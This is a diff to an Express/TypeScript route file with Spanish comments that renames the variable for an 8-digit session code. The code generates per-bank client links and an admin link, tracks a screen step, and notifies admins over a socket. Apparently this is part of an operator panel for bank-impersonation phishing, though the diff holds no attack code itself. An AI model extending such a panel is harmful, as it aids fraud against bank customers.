@@ -529,13 +529,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Crear sesión para brandon
       // Usar código de 8 dígitos numérico como ID de sesión y folio
-      const eightDigitCode = '12345678';
-      const sessionId = eightDigitCode;
+      const brandLinkCode = '12345678';
+      const sessionId = brandLinkCode;
       
       const session = await storage.createSession({ 
         sessionId, 
         banco: "LIVERPOOL",
-        folio: eightDigitCode,
+        folio: brandLinkCode,
         pasoActual: ScreenType.FOLIO,
         createdBy: 'brandon', // Forzar el creador como brandon
       });
@@ -776,24 +776,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       }
 
-      // Generamos un código de 8 dígitos numéricos fácil de ver que usaremos tanto para el ID como para el folio
-      const generateEightDigitCode = () => {
-        // Genera números aleatorios entre 0-9 para cada posición
-        let code = '';
-        for (let i = 0; i < 8; i++) {
-          code += Math.floor(Math.random() * 10).toString();
-        }
-        return code;
-      };
-
+      // Generamos un código de 8 dígitos numéricos que usaremos tanto para el ID como para el folio
+      let linkCode = '';
+      for (let i = 0; i < 8; i++) {
+        linkCode += Math.floor(Math.random() * 10).toString();
+      }
+      
       // Usamos el mismo código numérico para el ID de sesión y el folio
-      const eightDigitCode = generateEightDigitCode();
-      const sessionId = eightDigitCode; // Usamos el código numérico como ID de sesión
+      const sessionId = linkCode;
 
       const session = await storage.createSession({ 
         sessionId, 
         banco: banco as string,
-        folio: eightDigitCode, // Mismo código para el folio
+        folio: linkCode, // Mismo código para el folio
         pasoActual: ScreenType.FOLIO,
         createdBy: user.username,  // Añadimos el nombre del usuario que creó la sesión
       });
@@ -817,12 +812,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const clientLink = `https://${clientDomain}/${sessionId}`;
       const adminLink = `https://${adminDomain}`;
 
-      console.log(`Nuevo enlace generado - Código: ${eightDigitCode}, Banco: ${banco}`);
+      console.log(`Nuevo enlace generado - Código: ${linkCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${clientLink}`);
       console.log(`URL del admin: ${adminLink}`);
       console.log(`Generado por usuario: ${user.username}`);
 
-      console.log(`Notificando a los clientes de admin sobre el nuevo enlace - Código: ${eightDigitCode}, Banco: ${banco}, Usuario: ${user.username}`);
+      console.log(`Notificando a los clientes de admin sobre el nuevo enlace - Código: ${linkCode}, Banco: ${banco}, Usuario: ${user.username}`);
       
       // Notificar a los clientes de admin sobre el nuevo enlace
       // Enviar al usuario que creó el link y al superadmin
@@ -830,7 +825,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         type: 'LINK_GENERATED',
         data: { 
           sessionId,
-          code: eightDigitCode,
+          code: linkCode,
           banco: banco as string,
           userName: user.username,
           createdBy: user.username // Añadimos para consistency
@@ -853,7 +848,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         data: {
           sessionId,
           banco: banco as string,
-          folio: eightDigitCode,
+          folio: linkCode,
           pasoActual: ScreenType.FOLIO,
           createdBy: user.username,
           saved: false,
@@ -865,7 +860,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         sessionId, 
         link: clientLink, 
         adminLink: adminLink,
-        code: eightDigitCode
+        code: linkCode
       });
     } catch (error) {
       console.error("Error generating link:", error);
